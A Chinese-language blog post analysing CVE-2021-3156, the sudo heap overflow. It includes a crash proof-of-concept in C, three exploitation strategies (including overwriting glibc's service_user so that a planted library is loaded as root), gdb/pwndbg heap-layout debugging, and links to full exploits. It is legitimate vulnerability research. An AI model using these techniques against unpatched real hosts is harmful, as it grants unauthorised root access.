<!DOCTYPE html>
<html lang="EN">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>CVE-2021-3156 sudo heap-overflow 漏洞分析 | Swing&#39;Blog 浮生若梦</title>


<meta name="description" content="Know it then hack it!">


<meta name="author" content="Swing">



<!-- Canonical -->
<link rel="canonical" href="/CVE-2021-3156-analysis.html">

<!-- Favicon -->
<link rel="icon" href="/images/favicon.ico">

<!-- RSS -->

<link rel="alternate" type="application/rss+xml" title="Swing&#39;Blog 浮生若梦" href="/atom.xml">


<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-3156 sudo heap-overflow 漏洞分析">
<meta property="og:url" content="/CVE-2021-3156-analysis.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">

<meta property="og:description" content="Know it then hack it!">


<!-- Twitter Card -->
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2021-3156 sudo heap-overflow 漏洞分析">

<meta name="twitter:description" content="Know it then hack it!">


<!-- Theme Color -->
<meta name="theme-color" content="#1d1f21">
<meta name="msapplication-TileColor" content="#1d1f21">

<!-- Stylesheets -->

<link rel="stylesheet" href="/css/style.css">


<!-- Custom Layout Variables -->

<style>
:root {
  --page-width: 60rem;
  --content-width: 1200px;
  --mobile-padding: 12px;
}
</style>

<!-- Analytics -->


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="theme-dark">
  <div class="container">
    <header class="header">
  <div class="header-inner">
    <div class="header-brand">
      
      <a href="/" class="site-title">
        Swing&#39;Blog 浮生若梦
      </a>
    </div>

    <nav class="nav">
      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
      </button>

      <ul class="nav-menu" id="nav-menu">
        
          
          
            
            <li class="nav-item">
              <a href="/"
                 class="nav-link"
                 >
                Home
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/about/"
                 class="nav-link"
                 >
                About
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/archives/"
                 class="nav-link"
                 >
                Articles
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/atom.xml"
                 class="nav-link"
                 >
                RSS
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/categories/"
                 class="nav-link"
                 >
                Categories
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/link"
                 class="nav-link"
                 >
                Links
              </a>
            </li>
            
          
        
      </ul>
    </nav>
  </div>
</header>


    <main class="main">
      
        <div class="page-layout">
          <article class="post">
  <header class="post-header">
  <h1 class="post-title">CVE-2021-3156 sudo heap-overflow 漏洞分析</h1>

  <div class="post-meta">
    <span class="meta-item">
      <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zM9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
      <time datetime="2021-02-01">
        2021-02-01
      </time>
    </span>

    
      <span class="meta-item">
        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79s7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58s9.14-3.47 12.65 0L21 3v7.12z"/></svg>
        <time datetime="2021-02-03">
          Updated on 2021-02-03
        </time>
      </span>
    

    
      <span class="meta-item">
        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
        
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
        
      </span>
    
  </div>
</header>


  
    <nav class="toc">
  <h3 class="toc-title">Table of Contents</h3>
  <div class="toc-list">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">三种利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E5%88%A9%E7%94%A8"><span class="toc-text">编写利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol>
  </div>
</nav>

  

  <div class="post-content">
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>1 月26 日的时候， 有文章披露了 sudo 代码中存在 堆缓冲区溢出，于是花了漫长的时间尝试写相关利用, 本文以学习笔记为主。</p>
<p>完整利用可见：</p>
<p><a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p>
<blockquote>
<p>The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability.</p>
<p>Sudo is a powerful utility that’s included in most if not all Unix- and Linux-based OSes. It allows users to run programs with the security privileges of another user. The vulnerability itself has been hiding in plain sight for nearly 10 years. It was introduced in July 2011 (commit 8255ed69) and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.</p>
<p>Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host. Qualys security researchers have been able to independently verify the vulnerability and develop multiple variants of exploit and obtain full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and distributions are also likely to be exploitable.</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里以 sudo 1.8.31 版本作为分析目标。 ubuntu 20.04.1 作为分析环境</p>
<p>PoC:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> obufsz = <span class="number">8</span>;</span><br><span class="line">		<span class="keyword">char</span> obuf[obufsz];</span><br><span class="line">		<span class="built_in">memset</span>(obuf, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span>(obuf));</span><br><span class="line">		obuf[obufsz<span class="number">-2</span>] = <span class="number">0x5c</span>;</span><br><span class="line">		obuf[obufsz<span class="number">-1</span>] = <span class="number">0x00</span>;</span><br><span class="line">		<span class="keyword">char</span> *args[] = &#123;</span><br><span class="line">			<span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">			<span class="string">&quot;-s&quot;</span>,</span><br><span class="line">			obuf,</span><br><span class="line">			<span class="literal">NULL</span></span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> *extra_args[] = &#123;</span><br><span class="line">			<span class="string">&quot;X/X\\&quot;</span>,</span><br><span class="line">			<span class="string">&quot;a&quot;</span>,</span><br><span class="line">			<span class="string">&quot;LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,</span><br><span class="line">			<span class="literal">NULL</span>,</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		execve(args[<span class="number">0</span>], args, extra_args);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// execvpe(&quot;./sudoedit&quot;, args, extra_args);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞产生的代码位于 <code>plugins/sudoers/sudoers.c</code>  的 <code>set_cmnd</code> 函数</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" title="image-20210201141621764" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" alt="image-20210201141621764"></a></p>
<p>首先通过 854 处，为 <code>sudoedit</code>  <code>-s</code>  后的字符长度分配内存空间， 即 <code>user_args</code>,  当代码处理到 866 处的时候， 如果参数为如下结构，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p NewArgv[0]</span><br><span class="line">$4 &#x3D; 0x55555557183e &quot;sudoedit&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[1]</span><br><span class="line">$5 &#x3D; 0x7fffffffee13 &quot;BBBBBB\\&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[2]</span><br><span class="line">$6 &#x3D; 0x0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>第一次拷贝 会将 <code>B</code> 拷贝到 <code>user_args</code> 里，然后 from ++ </p>
<p>当 <code>B</code> 拷贝完， <code>from[0] == &#39;\\&#39;</code> ， 且<code>from[1]</code> 不为空的时候， 此时 from ++ , 然后又进到这个 while 循环， from 后面的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p from[0]</span><br><span class="line">$3 &#x3D; 92 &#39;\\&#39;</span><br><span class="line">pwndbg&gt; p from[1]</span><br><span class="line">$4 &#x3D; 0 &#39;\000&#39;</span><br></pre></td></tr></table></figure>

<p>这个时候 from 后面的数据为环境变量设置的数据, 即这里此时 <code>from[0]</code> 为 <code>X/X</code> 。最终结果就是 <code>user_args</code> 被越界</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h4 id="三种利用思路"><a href="#三种利用思路" class="headerlink" title="三种利用思路"></a>三种利用思路</h4><p>原作者的提到了， 他们通过随机添加 <code>LC_*</code> 等环境变量来风水堆布局， 产生了数十种 crash 样本，其中有三种利用思路，</p>
<p>（1）通过覆写 <code>sudo_hook_entry</code>  结构体</p>
<pre><code>该部分代码位于 `src/hooks.c`  107行 ， 总体思路为 通过堆溢出，劫持函数指针getenv_fn 的低两位， 通过爆破的方法将函数劫持到 `execv` 来执行我们的程序。 该思路已经有公开的利用代码,  可见[Github](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)
</code></pre>
<p>   (2)  通过覆写 <code>service_user</code> 结构体</p>
<pre><code>该部分代码位于 glibc 源代码中的 `glibc-2.31/nss/nsswitch.c` 的330 行， 
</code></pre>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line"><span class="number">329</span> &#123;</span><br><span class="line"><span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">331</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">338</span>       ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line"><span class="number">339</span>                                      ni-&gt;name);</span><br><span class="line">...</span><br><span class="line"><span class="number">342</span>     &#125;</span><br><span class="line"><span class="number">343</span> </span><br><span class="line"><span class="number">344</span>   <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">345</span>     &#123;</span><br><span class="line"><span class="number">346</span>       <span class="comment">/* Load the shared library.  */</span></span><br><span class="line"><span class="number">347</span>       <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line"><span class="number">348</span>                       + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line"><span class="number">349</span>       <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line"><span class="number">350</span>       <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"><span class="number">351</span> </span><br><span class="line"><span class="number">352</span>       <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line"><span class="number">353</span>       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line"><span class="number">354</span>                                               <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line"><span class="number">355</span>                                     ni-&gt;name),</span><br><span class="line"><span class="number">356</span>                           <span class="string">&quot;.so&quot;</span>),</span><br><span class="line"><span class="number">357</span>                 __nss_shlib_revision);</span><br><span class="line"><span class="number">358</span> </span><br><span class="line"><span class="number">359</span>       ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br></pre></td></tr></table></figure>

<p>我们通过覆盖 <code>ni-&gt;name</code> ，让程序去 <code>___libc_dlopen</code> 加载我们编写的 libc 库， 在加上 <code>__attribute__ ((constructor))</code> 的魔术方法，来让加载 libc 后第一时间执行我们的代码，</p>
<p>（3）通过覆写 <code>def_timestampdir </code>结构体</p>
<pre><code>将def_timestampdir覆盖为一个不存在的目录。然后我们可以与sudo的`ts_mkdirs()`竞争，创建一个指向任意文件的符号链接。并且尝试打开这个文件，向其中写入一个struct timestamp_entry。我们可以符号链接将其指向/etc/passwd，然后以root打开他，然后实现任意用户的注入从而root

这个类似的利用似乎也有 [Github](https://github.com/r4j0x00/exploits/blob/master/CVE-2021-3156/exploit.c)
</code></pre>
<h4 id="编写利用"><a href="#编写利用" class="headerlink" title="编写利用"></a>编写利用</h4><p>这里简单描述一下，我之前调试编写利用第二种方法的过程</p>
<p>首先我们知道了 <code>sudo</code> 代码会根据环境变量中的 <code>LC*</code> 来分配释放堆布局</p>
<blockquote>
<p>  in setlocale(), we malloc()ate and free() several LC  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby creating small holes at   the very beginning of Sudo’s heap (free fast or tcache chunks);</p>
</blockquote>
<p>其次，我们需要明确我们的目标是，我们要让分配的 <code>user_args</code>  结构体 与 <code>service_user</code> 结构体两者间的距离越近越好，因此，我们通过（fuzz 和 手动调试的方法来风水堆布局。</p>
<p>那么如何判断两者间的距离呢？ 首先我们对分配 <code>user_args</code> 代码处下断， 即 <code>b sudoers.c:854</code> , 然后对使用 <code>service_user</code> 处下断，，即<code>b nsswitch.c:330</code> </p>
<p>由于我们的利用是通过 <code>execve</code> 来执行 <code>sudoedit</code> ， 因此我们调试的是我们编写利用程序的子进程，因此还需要设置下 gdb 的调试模式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br></pre></td></tr></table></figure>

<p>这样就行了， 我将以上东西集成到一个 gdb 调试脚本中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b policy_check</span><br><span class="line">c</span><br><span class="line">b sudoers.c:854</span><br><span class="line">b nsswitch.c:330  </span><br></pre></td></tr></table></figure>



<p>然后挂上调试器  <code>gdb exploit -x gdbscript</code> , 查看两者偏移,  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/Desktop/CVE<span class="number">-2021</span><span class="number">-3156</span>/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c</span><br><span class="line">   <span class="number">849</span> 	    <span class="keyword">size_t</span> size, n;</span><br><span class="line">   <span class="number">850</span></span><br><span class="line">   <span class="number">851</span> 	    <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">   <span class="number">852</span> 	    <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">   <span class="number">853</span> 		size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"> ► <span class="number">854</span> 	    <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="number">855</span> 		sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">   <span class="number">856</span> 		debug_return_int(<span class="number">-1</span>);</span><br><span class="line">   <span class="number">857</span> 	    &#125;</span><br><span class="line">   <span class="number">858</span> 	    <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">   <span class="number">859</span> 		<span class="comment">/*</span></span><br><span class="line"><span class="comment">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK </span></span><br><span class="line"><span class="comment">pwndbg&gt; bins</span></span><br><span class="line"><span class="comment">tcachebins</span></span><br><span class="line"><span class="comment">0x20 [  3]: 0x55555557ebc0 —▸ 0x5555555975c0 —▸ 0x55555558f0a0 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x40 [  1]: 0x555555586700 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x70 [  1]: 0x55555558f620 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x80 [  1]: 0x555555586680 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x90 [  1]: 0x555555586b60 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x110 [  1]: 0x555555597480 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x190 [  1]: 0x555555584820 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x1a0 [  1]: 0x5555555896d0 ◂— 0x0</span></span><br><span class="line"><span class="comment">0x1e0 [  1]: 0x55555558f440 ◂— 0x0</span></span><br></pre></td></tr></table></figure>

<p>这里的 <code>tcachebins</code> 是我们即将分配的 <code>user_args</code> chunk，具体分配是哪个， 取决于 <code>user_args</code> 的大小， 然后再 c 一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/glibc<span class="number">-2.31</span>/nss/nsswitch.c</span><br><span class="line">   <span class="number">325</span> <span class="meta">#<span class="meta-keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">   <span class="number">326</span> <span class="comment">/* Load library.  */</span></span><br><span class="line">   <span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">   <span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line">   <span class="number">329</span> &#123;</span><br><span class="line"> ► <span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="number">331</span>     &#123;</span><br><span class="line">   <span class="number">332</span>       <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">   333 	 library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">   334 	 is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">   335 	 holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment">pwndbg&gt; p ni</span></span><br><span class="line"><span class="comment">$1 = (service_user *) 0x555555582c20</span></span><br><span class="line"><span class="comment">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<p>获取 <code>ni</code> 的地址， 与上面的 <code>tcachebins</code> 进行比较， 越近越好， 我最初的利用脚本两者偏移最小为 0x700 左右，然后中间一路覆盖过去</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" title="image-20210201152543462" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" alt="image-20210201152543462"></a></p>
<p>将 <code>ni-&gt;name</code> 覆盖为 “X/X” ,其余内容以 <code>\0</code> 覆盖，这里会涉及一个问题，那么就是如何传入<code>\00</code> 字符呢？ 我们知道 参数和环境变量都是不允许写入 <code>\x00</code>的，否则将被截断。通过阅读代码和调试我们最终发现 我们可以单独的 <code>\\</code> 字符来作为一个 <code>\x00</code> 字符。</p>
<p>最后提及一下，非源码调试的方法，因为当我编写利用后，在本地执行是成功了，但是换了一个机器，即非编译的 sudo 的程序执行的时候却，失败了，这个时候发现自己编译的和系统自带还是不一样的，于是我又写了一个不是自己编译的利用。</p>
<p>当非源码调试的时候，由于漏洞函数是位于 <code>sudoers.so</code>中，该 so 库并不是一开始就加载的，我们没法在没有符号 和 没有加载的情况下直接下断，所以我们在我们的 <code>payload</code> 设置一些特殊的字符， 比如 <code>0xdeadbeaf</code> 比如我这里设置一个单独的设置 args 参数为 ”BBBBBB”</p>
<p>以及我们再选择对 libc 中的 <code>__libc_dlopen_mode</code> 函数下断，因为我们最终的目的是 dlopen 我们的目标 so 程序，以及下到这个，也相当于到了 nss_load 函数附近了。</p>
<p>但是对这个<code> __libc_dlopen_mode</code> 可能需要 glibc 的调试符号，可以通过 <code>apt install libc6-dbg</code>  来安装，以及下断需要开启 <code>Pending Breakpoints</code> 功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat gdbscript</span><br><span class="line">catch exec</span><br><span class="line">set breakpoint pending on</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b __libc_dlopen_mode</span><br></pre></td></tr></table></figure>

<p>执行 <code>gdb ./exploit -x gdbscript</code></p>
<p>c 一次， 断到 <code>__libc_dlopen_mode</code> 这是第一次 sudo 在执行 <code>set_cmnd</code> 之前 <code>getpwuid</code> 的 nss_load 操作</p>
<p>再 c 一次 ， 这个就是 <code>set_cmnd</code> 之后就的 nss_load , 此时就是溢出之后的， 我们可以通过 <code>search BBBB</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search &quot;BBBB&quot;</span><br><span class="line">[heap]          0x555555588bc0 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc4 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc8 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来看我们分配的堆的位置</p>
<p>以及查看此时的寄存器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x7fffffffb2ea ◂— 0x336a00322e6f732e &#x2F;* &#39;.so.2&#39; *&#x2F;</span><br><span class="line">*RBX  0x555555585df0 —▸ 0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line"> RCX  0x322e</span><br><span class="line">*RDX  0x582f58</span><br><span class="line">*RDI  0x7fffffffb2e0 ◂— &#39;libnss_X&#x2F;X.so.2&#39;</span><br><span class="line"> RSI  0x80000002</span><br><span class="line">*R8   0x555555585df0 —▸ 0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R9   0x7fffffffb1f0 ◂— 0x0</span><br><span class="line">*R10  0x10</span><br><span class="line"> R11  0x7ffff7f37be0 (main_arena+96) —▸ 0x5555555a06e0 ◂— 0x0</span><br><span class="line">*R12  0x5555555891b0 ◂— 0x0</span><br><span class="line">*R13  0x5555555891e0 ◂— 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R14  0x7fffffffb2f0 —▸ 0x7ffff7f0336a ◂— 0x6225206125000200</span><br><span class="line">*R15  0x16</span><br><span class="line">*RBP  0x7fffffffb340 —▸ 0x7fffffffb3a0 ◂— 0x0</span><br><span class="line">*RSP  0x7fffffffb2d8 —▸ 0x7ffff7e9262c (nss_load_library+364) ◂— mov    r10, qword ptr [rbp - 0x48]</span><br><span class="line"> RIP  0x7ffff7eae930 (__libc_dlopen_mode) ◂— endbr64 </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>0x5555555891e0 地址为要被覆盖的目标</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x 0x5555555891e0 - 0x555555588bc0</span><br><span class="line">$1 &#x3D; 0x620</span><br></pre></td></tr></table></figure>

<p>通过这样的方法来查看两者的偏移</p>
<p>最后的利用见 <a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p>
